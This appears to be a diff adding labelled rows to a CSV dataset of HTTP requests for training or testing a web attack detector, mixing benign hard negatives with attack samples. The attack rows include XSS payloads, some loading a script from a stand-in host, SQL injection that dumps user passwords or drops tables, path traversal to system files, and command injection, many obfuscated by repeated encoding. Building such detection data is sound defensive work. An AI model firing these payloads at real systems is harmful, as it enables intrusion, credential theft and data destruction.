+POST,/search,input=%3Ca%20href%3D%22javascript%3Aalert%28%27AegisGate%27%29%22%3Eclick%3C/a%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<a href=\""javascript:alert('AegisGate')\"">click</a>""}",1,XSS,synthetic,676648eaac32
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<script>alert(document.domain)</script>""}",1,XSS,synthetic,18bb97fb8d60
+GET,/api/v1/search,q=1%20OR%201%3D1,"{""User-Agent"": ""Mozilla/5.0""}",user=1%20OR%201%3D1&pass=123,1,SQLi,synthetic,30c2fa659b80
+POST,/search,input=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,b73ec5a6cb35
+POST,/api/v1/login,q=admin%27%20--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,12c664c16bb9
+GET,/api/v1/search,q=admin%27%20--,"{""User-Agent"": ""Mozilla/5.0""}",user=admin%27%20--&pass=123,1,SQLi,synthetic,248ed0f86e5c
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<img src=x onerror=alert('XSS')>""}",1,XSS,synthetic,ca0dce29fa58
+GET,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<img src=x onerror=alert('XSS')>""}",1,XSS,synthetic,296169543356
+GET,/search,input=%3Csvg%20onload%3Dalert%281%29%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,e3fc860fe298
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%20sleep%285%29%23&pass=123,1,SQLi,synthetic,3934ca098af5
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""javascript:alert(1)""}",1,XSS,synthetic,0caf8fe7988c
+POST,/api/v1/comments,input=javascript%3Aalert%281%29,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,7b25e1f63e7c
+POST,/api/v1/comments,input=%3Ca%20href%3D%22javascript%3Aalert%28%27AegisGate%27%29%22%3Eclick%3C/a%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,4266e54ac3a0
+GET,/api/v1/comments,input=%27%22%3E%3Cscript%20src%3Dhttp%3A//test.local/xss.js%3E%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""'\""><script src=http://test.local/xss.js></script>""}",1,XSS,synthetic,ebec00a624ee
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%20OR%201%3D1&pass=123,1,SQLi,synthetic,316ba07cf6f3
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=admin%27%20--&pass=123,1,SQLi,synthetic,654e226e9361
+GET,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users--&pass=123,1,SQLi,synthetic,d5dbf5d7c5f6
+GET,/api/v1/search,q=%27%20OR%20sleep%285%29%23,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,d38b299ab077
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%20%27a%27%3D%27a&pass=123,1,SQLi,synthetic,992942aaec43
+POST,/search,input=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<iframe src=\""javascript:alert(1)\"">""}",1,XSS,synthetic,b4f591866047
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,synthetic,a5c5435c37e8
+POST,/api/v1/comments,input=%3Csvg%20onload%3Dalert%281%29%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<svg onload=alert(1)>""}",1,XSS,synthetic,76c53118f854
+POST,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<a href=\""javascript:alert('AegisGate')\"">click</a>""}",1,XSS,synthetic,135165ad7efd
+GET,/api/v1/search,q=1%3B%20DROP%20TABLE%20logs--,"{""User-Agent"": ""Mozilla/5.0""}",user=1%3B%20DROP%20TABLE%20logs--&pass=123,1,SQLi,synthetic,1dc42068a19c
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""javascript:alert(1)""}",1,XSS,synthetic,b1ac5fd10698
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users--&pass=123,1,SQLi,synthetic,32bc8d30bec9
+GET,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""'\""><script src=http://test.local/xss.js></script>""}",1,XSS,synthetic,bdac1f88a5f7
+POST,/api/v1/search,q=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--&pass=123,1,SQLi,synthetic,58787ad79cda
+POST,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<svg onload=alert(1)>""}",1,XSS,synthetic,ab870791b997
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%3B%20DROP%20TABLE%20logs--&pass=123,1,SQLi,synthetic,31002aa5ff60
+GET,/api/v1/comments,input=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,29c63350da05
+GET,/api/v1/search,q=%27%20OR%20%27a%27%3D%27a,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%20%27a%27%3D%27a&pass=123,1,SQLi,synthetic,83ee765e99a4
+GET,/api/v1/login,q=%27%20OR%201%3D1--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%201%3D1--&pass=123,1,SQLi,synthetic,72213b482800
+POST,/search,input=%3Cscript%3Ealert%28document.domain%29%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<script>alert(document.domain)</script>""}",1,XSS,synthetic,eb6cf6df4c56
+GET,/api/v1/login,q=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,29f19fbac702
+GET,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20ORDER%20BY%2010--&pass=123,1,SQLi,synthetic,10d26c9a02ba
+POST,/api/v1/comments,input=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<iframe src=\""javascript:alert(1)\"">""}",1,XSS,synthetic,58857f88afd1
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<img src=x onerror=alert('XSS')>""}",1,XSS,synthetic,c52ec545c20e
+GET,/api/v1/comments,input=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<body onload=alert('XSS')>""}",1,XSS,synthetic,d38dab58ff8e
+GET,/api/v1/search,q=Please%20update%20my%20shipping%20address%20for%20order%20%2349281&category=blog&sort=relevance,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,Benign,hard_negatives,e591f8021eb0
+GET,/api/v1/search,q=Drop%20by%20our%20office%20anytime%20during%20business%20hours&category=blog&sort=relevance,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,Benign,hard_negatives,d25ea8e24142
+GET,/api/v1/search,q=Discussion%20on%20table%20manners%20and%20dining%20etiquette&category=blog&sort=relevance,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,Benign,hard_negatives,928d5a02798b
+GET,/api/v1/search,q=Create%20high%20quality%20thumbnail%20images%20with%20Canva&category=blog&sort=relevance,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,Benign,hard_negatives,89f081e31c96
+GET,/api/v1/search,q=Understanding%20database%20normalization%20and%20entity%20relationship%20models&category=blog&sort=relevance,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,Benign,hard_negatives,0e71bc1dbcf9
+GET,/api/v1/search,q=Can%20I%20delete%20my%20account%20permanently%20from%20the%20settings%20panel&category=blog&sort=relevance,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,Benign,hard_negatives,81a5f139790e
+GET,/api/v1/search,q=The%20union%20of%20two%20mathematical%20sets%20explained%20with%20Venn%20diagrams&category=blog&sort=relevance,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,Benign,hard_negatives,fb6f8cd2cc65
+GET,/api/v1/search,q=Grant%20permission%20for%20microphone%20access%20in%20Chrome%20browser&category=blog&sort=relevance,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,Benign,hard_negatives,7882b3738feb
+GET,/api/v1/search,q=Executive%20order%20regarding%20technology%20export%20regulations&category=blog&sort=relevance,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,Benign,hard_negatives,ce43d3c32fdb
+POST,/api/v1/forum/posts,,"{""Content-Type"": ""application/json"", ""User-Agent"": ""Mozilla/5.0""}","{""title"": ""Help with code snippet"", ""content"": ""def query_user_records(user_id):\n    return db.query(User).filter_by(id=user_id).first()"", ""tags"": [""python"", ""js""]}",0,Benign,hard_negatives,7ef6802370ba
+POST,/api/v1/forum/posts,,"{""Content-Type"": ""application/json"", ""User-Agent"": ""Mozilla/5.0""}","{""title"": ""Help with code snippet"", ""content"": ""<div className=\""user-card\""><h3>Welcome User</h3></div>"", ""tags"": [""python"", ""js""]}",0,Benign,hard_negatives,53241990584c
+POST,/api/v1/forum/posts,,"{""Content-Type"": ""application/json"", ""User-Agent"": ""Mozilla/5.0""}","{""title"": ""Help with code snippet"", ""content"": ""SELECT * FROM items WHERE category = 'books' -- standard reference query"", ""tags"": [""python"", ""js""]}",0,Benign,hard_negatives,33d78a4dcd4b
+POST,/api/v1/forum/posts,,"{""Content-Type"": ""application/json"", ""User-Agent"": ""Mozilla/5.0""}","{""title"": ""Help with code snippet"", ""content"": ""import numpy as np\nx = np.array([1, 2, 3])"", ""tags"": [""python"", ""js""]}",0,Benign,hard_negatives,7a6eea06250d
+POST,/api/v1/forum/posts,,"{""Content-Type"": ""application/json"", ""User-Agent"": ""Mozilla/5.0""}","{""title"": ""Help with code snippet"", ""content"": ""function formatOutput(str) { return str.replace(/<[^>]*>/g, ''); }"", ""tags"": [""python"", ""js""]}",0,Benign,hard_negatives,9979edf8fc16
+POST,/api/v1/analytics/filter,,"{""Content-Type"": ""application/json"", ""User-Agent"": ""AegisClient/1.0""}","{""rule"": ""age >= 18 and income > 30000"", ""status"": ""active""}",0,Benign,hard_negatives,aa6009dcd6e1
+POST,/api/v1/analytics/filter,,"{""Content-Type"": ""application/json"", ""User-Agent"": ""AegisClient/1.0""}","{""expression"": ""total_price < discount_threshold"", ""valid"": true}",0,Benign,hard_negatives,5540605146d7
+POST,/api/v1/analytics/filter,,"{""Content-Type"": ""application/json"", ""User-Agent"": ""AegisClient/1.0""}","{""bounds"": {""min"": ""<0>"", ""max"": ""<1000>""}, ""type"": ""range""}",0,Benign,hard_negatives,b2178e9803a8
+GET,/api/v1/files/download,download=photo.profile.avatar.300x300.webp,"{""User-Agent"": ""Mozilla/5.0""}",,0,Benign,hard_negatives,e817b68303b2
+GET,/api/v1/files/download,asset=bundle.esm.min.js&version=1.4.2,"{""User-Agent"": ""Mozilla/5.0""}",,0,Benign,hard_negatives,d7b60e02f1fa
+GET,/api/v1/files/download,document=archive.2023.backup.tar.gz,"{""User-Agent"": ""Mozilla/5.0""}",,0,Benign,hard_negatives,80e841bab17d
+GET,/api/v1/files/download,preview=user.guide.chapter.1.3.docx,"{""User-Agent"": ""Mozilla/5.0""}",,0,Benign,hard_negatives,b8e9eeb862d2
+GET,/api/v1/search,lang=ta&q=%E0%AE%B5%E0%AE%A3%E0%AE%95%E0%AF%8D%E0%AE%95%E0%AE%AE%E0%AF%8D%21%20%E0%AE%89%E0%AE%99%E0%AF%8D%E0%AE%95%E0%AE%B3%E0%AF%8D%20%E0%AE%9A%E0%AF%87%E0%AE%B5%E0%AF%88%20%E0%AE%AE%E0%AE%BF%E0%AE%95%20%E0%AE%85%E0%AE%B0%E0%AF%81%E0%AE%AE%E0%AF%88.,"{""Accept-Language"": ""ta,en-US;q=0.9"", ""User-Agent"": ""Mozilla/5.0""}",,0,Benign,hard_negatives,5a57f743a899
+GET,/api/v1/search,lang=ta&q=%E0%AE%AA%E0%AE%BE%E0%AE%A4%E0%AF%81%E0%AE%95%E0%AE%BE%E0%AE%AA%E0%AF%8D%E0%AE%AA%E0%AF%81%20%E0%AE%9A%E0%AF%8B%E0%AE%A4%E0%AE%A9%E0%AF%88%20%E0%AE%AE%E0%AE%B1%E0%AF%8D%E0%AE%B1%E0%AF%81%E0%AE%AE%E0%AF%8D%20%E0%AE%AA%E0%AE%AF%E0%AE%A9%E0%AE%B0%E0%AF%8D%20%E0%AE%95%E0%AE%A3%E0%AE%95%E0%AF%8D%E0%AE%95%E0%AF%81%20%E0%AE%AE%E0%AF%87%E0%AE%B2%E0%AE%BE%E0%AE%A3%E0%AF%8D%E0%AE%AE%E0%AF%88,"{""Accept-Language"": ""ta,en-US;q=0.9"", ""User-Agent"": ""Mozilla/5.0""}",,0,Benign,hard_negatives,a3f326c2d1b3
+GET,/api/v1/search,lang=ta&q=%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%81%AE%E3%83%86%E3%82%B9%E3%83%88%E6%A4%9C%E7%B4%A2%E3%82%AF%E3%82%A8%E3%83%AA,"{""Accept-Language"": ""ta,en-US;q=0.9"", ""User-Agent"": ""Mozilla/5.0""}",,0,Benign,hard_negatives,e3cd9f777c80
+GET,/api/v1/search,lang=ta&q=B%C3%BCcher%20%C3%BCber%20k%C3%BCnstliche%20Intelligenz%20und%20Datensicherheit,"{""Accept-Language"": ""ta,en-US;q=0.9"", ""User-Agent"": ""Mozilla/5.0""}",,0,Benign,hard_negatives,fce53adb15d7
+POST,/api/v1/user/avatar,,"{""Authorization"": ""Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNTE2MjM5MDIyfQ"", ""Content-Type"": ""application/json""}","{""avatar_data"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxM""}",0,Benign,hard_negatives,c6e6ac7938c0
+GET,/tienda1/publico/buscar.jsp,"teXTO=1' UniON SElECt UserNAME, pASSWORd from UsuarIOS--","{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",,1,SQLi,mutation_aug,b07e040d599b
+GET,/tienda1/publico/ver.jsp,id%3D..%2F..%2F..%2Fetc%2Fpasswd,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",,1,Path Traversal,mutation_aug,12e2887ac2e4
+POST,/tienda1/miembros/editar.jsp,,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",nombrE=aDmIn' Or '1'='1&eMAil=ADMIn@TEsT.es,1,SQLi,mutation_aug,50e28fea49a6
+POST,/tienda1/publico/anadir.jsp,,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",id=1&nombre=<script&#62;alert(&#39;xss&#x27;)&#60;/script>&precio=10,1,XSS,mutation_aug,5a6d125aecf6
+POST,/tienda1/publico/anadir.jsp,,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",id=1&nombre=<script>alert(0x787373)</script>&precio=10,1,XSS,mutation_aug,5a6d125aecf6
+GET,/tienda1/publico/ver.jsp,id%3D..%2f..%2fwindows%2fwin.ini,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",,1,Path Traversal,mutation_aug,43f1ea04524d
+POST,/tienda1/publico/anadir.jsp,,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}","id=1';  DROP
+TABLE/**/cart;--&cantidad=1",1,SQLi,mutation_aug,66bf6d3a7732
+GET,/search,inPUt=JaVASCrIPt%3AALERt%281%29,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""javascript:alert(1)""}",1,XSS,mutation_aug,f46e38273a63
+POST,/api/v1/auth/refresh,,"{""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""192.168.1.109""}","{""refresh_token"":
+""invalid.tampered.jwt_token_signature""}",1,Brute Force/Auth Abuse,mutation_aug,74af583d5b19
+POST,/api/v1/auth/refresh,,"{""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""192.168.1.109""}","{""refresh_token"":%20""invalid.tampered.jwt_token_signature%22}",1,Brute Force/Auth Abuse,mutation_aug,74af583d5b19
+GET,/api/v1/login,q%253D1%252527%252520AND%252520%252528SELECT%2525201%252520FROM%252520%252528SELECT%252520COUNT%252528%25252A%252529%25252C%252520CONCAT%252528%252528SELECT%252520version%252528%252529%252529%25252C%252520FLOOR%252528RAND%2525280%252529%25252A2%252529%252529%252520x%252520FROM%252520information_schema.tables%252520GROUP%252520BY%252520x%252529%252520a%252529--,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,mutation_aug,9325a351c6d2
+GET,/search,iNpuT=%3CscripT%3ealErt%28dOcUMeNT.DOmain%29%3c/SCRIpt%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,3e3c8269efd0
+GET,/api/v1/static/....//....//....//etc/passwd,file%253D....%252F%252F....%252F%252F....%252F%252Fetc%252Fpasswd,"{""User-Agent"": ""Mozilla/5.0""}",,1,Path Traversal,mutation_aug,d38312606f6a
+GET,/search,INPuT=%3Ca%20HReF%3d%22JavAscRIpt%3AAleRT%28%27AEgisGaTE%27%29%22%3EcLIck%3C/A%3e,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,6d1170faf15d
+POST,/api/v1/auth/login,,"{""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""192.168.1.245""}",%257B%2522username%2522%253A%2520%2522admin%2522%252C%2520%2522password%2522%253A%2520%2522admin123%2522%257D,1,Brute Force/Auth Abuse,mutation_aug,f02295cce453
+POST,/api/v1/admin/ping,,"{""Content-Type"": ""application/x-www-form-urlencoded""}",Ip=127.0.0.1%3b%20UNAmE%20-A,1,Command Injection,mutation_aug,50fc4005e7c1
+GET,/api/v1/static/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,file%253D%2525252e%2525252e%2525252f%2525252e%2525252e%2525252f%2525252e%2525252e%2525252fetc%2525252fpasswd,"{""User-Agent"": ""Mozilla/5.0""}",,1,Path Traversal,mutation_aug,043f00539530
+POST,/api/v1/admin/ping,,"{""Content-Type"": ""application/x-www-form-urlencoded""}",ip%253D127.0.0.1%252526%252520whoami,1,Command Injection,mutation_aug,9455c7b3490c
+POST,/api/v1/auth/login,,"{""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""192.168.1.21""}","{&#34;username&#34;: &#x22;guest&#x22;, &quot;password"": &quot;guest&#34;}",1,Brute Force/Auth Abuse,mutation_aug,dbb04fad1d2e
+POST,/api/v1/auth/login,,"{""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""192.168.1.21""}","{""username%22:%20%22guest%22,%20""password%22: ""guest%22}",1,Brute Force/Auth Abuse,mutation_aug,dbb04fad1d2e
+POST,/api/v1/auth/login,,"{""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""192.168.1.62""}","{&#x22;username&#34;: &#x22;root&#x22;, &quot;password&#34;: &#x22;toor&#34;}",1,Brute Force/Auth Abuse,mutation_aug,20a7dce568d6
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}",{&quot;comment&#34;: &quot;&#x3c;body onload=alert(&#39;XSS&#39;)&#x3e;&#34;},1,XSS,mutation_aug,d67606d9712d
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}",%257B%2522comment%2522%253A%2520%2522%253Cbody%2520onload%253Dalert%2528%2527XSS%2527%2529%253E%2522%257D,1,XSS,mutation_aug,d67606d9712d
+GET,/api/v1/comments,input%3Djavascript%3Aalert%281%29,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""javascript:alert(1)""}",1,XSS,mutation_aug,3509737c49a8
+POST,/api/v1/login,q=admin%27%20%2D%2D,"{""User-Agent"": ""Mozilla/5.0""}",user=admin%27%20--&pass=123,1,SQLi,mutation_aug,8d6d3a9e937b
+POST,/api/v1/login,q%253D%252527%252520UNION%252520SELECT%252520username%25252C%252520password%252520FROM%252520users--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,7d690840fe32
+POST,/api/v1/login,Q=%27%20UniOn%20SeLEct%20usErNAME%2C%20PASswoRD%20from%20USerS--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,7d690840fe32
+GET,/search,INput=%3cSVG%20onLoad%3daLeRt%281%29%3e,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<svg onload=alert(1)>""}",1,XSS,mutation_aug,1a7b68bdde47
+GET,/api/v1/static/C:\windows\system32\drivers\etc\hosts,fILe=C%3A%5cwINdOWs%5cSYsteM32%5CDrIVErS%5ceTc%5cHOSTs,"{""User-Agent"": ""Mozilla/5.0""}",,1,Path Traversal,mutation_aug,3d79dfd7e8eb
+GET,/api/v1/static/../../../../boot.ini,file%253D..%252F..%252F..%252F..%252Fboot.ini,"{""User-Agent"": ""Mozilla/5.0""}",,1,Path Traversal,mutation_aug,d49dccd6af1a
+POST,/search,input%253D%25253Cimg%252520src%25253Dx%252520onerror%25253Dalert%252528%252527XSS%252527%252529%25253E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<img src=x onerror=alert('XSS')>""}",1,XSS,mutation_aug,804a58672626
+POST,/api/v1/login,q%253D1%252527%252520AND%252520%252528SELECT%2525201%252520FROM%252520%252528SELECT%252520COUNT%252528%25252A%252529%25252C%252520CONCAT%252528%252528SELECT%252520version%252528%252529%252529%25252C%252520FLOOR%252528RAND%2525280%252529%25252A2%252529%252529%252520x%252520FROM%252520information_schema.tables%252520GROUP%252520BY%252520x%252529%252520a%252529--,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,mutation_aug,9a6db987a6ff
+POST,/api/v1/login,q%3D1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29-%2D,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,mutation_aug,9a6db987a6ff
+GET,/api/v1/login,q%3D%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%2D%2D,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,bf0c16ef9206
+GET,/api/v1/login,q=%27%20UN/**/ION%20SEL/**/ECT%20username%2C%20password%20FR/**/OM%20users--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,bf0c16ef9206
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user%253D%252527%25253B%252520WAITFOR%252520DELAY%252520%2525270%25253A0%25253A5%252527--%2526pass%253D123,1,SQLi,mutation_aug,bd9ab6681355
+GET,/search,input=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<script>alert(document.domain)</script>""}",1,XSS,mutation_aug,0216ea9a56ce
+POST,/search,input%253Djavascript%25253Aalert%2525281%252529,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""javascript:alert(1)""}",1,XSS,mutation_aug,955da9602fb8
+GET,/api/v1/search,q%253D1%252527%252520ORDER%252520BY%25252010--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,71ce49049aef
+GET,/api/v1/search,Q=%27%20UniOn%20sElEct%20NUll%2C%20null%2C%20NuLL--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL--&pass=123,1,SQLi,mutation_aug,d2acc15453b6
+POST,/api/v1/login,q=1%3B%20DROP%20TABLE%20logs%2D-,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,85d30114f912
+POST,/api/v1/login,q=1%3B%20DrOP%20tAbLe%20Logs--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,85d30114f912
+POST,/api/v1/search,q=%27%20UN/**/ION%20SEL/**/ECT%20NULL%2C%20NULL%2C%20NULL--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,4c4ae68bed73
+POST,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}",%257B%2522comment%2522%253A%2520%2522%2527%255C%2522%253E%253Cscript%2520src%253Dhttp%253A%252F%252Ftest.local%252Fxss.js%253E%253C%252Fscript%253E%2522%257D,1,XSS,mutation_aug,88805d1ac19c
+POST,/search,inPut=%27%22%3e%3CSCript%20SRC%3dHTTp%3A//TesT.LOcal/xss.jS%3e%3C/sCriPT%3e,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,c999df2608ff
+POST,/search,input=%27%22%3E%3Cscript%20src%3Dhttp%3A//test.local%2Fxss.js%3E%3C%2Fscript%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,c999df2608ff
+POST,/api/v1/search,Q=1%3b%20dRoP%20TaBlE%20lOgS--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,6378146d361d
+GET,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user%253D1%252520OR%2525201%25253D1%2526pass%253D123,1,SQLi,mutation_aug,4b1e3ec51b58
+POST,/api/v1/comments,input%253Djavascript%25253Aalert%2525281%252529,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""javascript:alert(1)""}",1,XSS,mutation_aug,41a1d05d5087
+POST,/api/v1/comments,input%3D%3Csvg%20onload%3Dalert%281%29%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,412a754b3d67
+POST,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}",%257B%2522comment%2522%253A%2520%2522%253Cimg%2520src%253Dx%2520onerror%253Dalert%2528%2527XSS%2527%2529%253E%2522%257D,1,XSS,mutation_aug,2f70136c932d
+POST,/api/v1/search,q%253Dadmin%252527%252529%252520OR%252520%252528%2525271%252527%25253D%2525271%252527--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,dbb5263b7fbf
+GET,/api/v1/login,q%253D%252527%25253B%252520WAITFOR%252520DELAY%252520%2525270%25253A0%25253A5%252527--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--&pass=123,1,SQLi,mutation_aug,681a0a49bc3e
+GET,/api/v1/login,q%3D%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27-%2D,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--&pass=123,1,SQLi,mutation_aug,681a0a49bc3e
+GET,/search,INPuT=%3cBODY%20OnLoaD%3DALErt%28%27XSS%27%29%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,773528530881
+GET,/search,input%253D%25253Cbody%252520onload%25253Dalert%252528%252527XSS%252527%252529%25253E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,773528530881
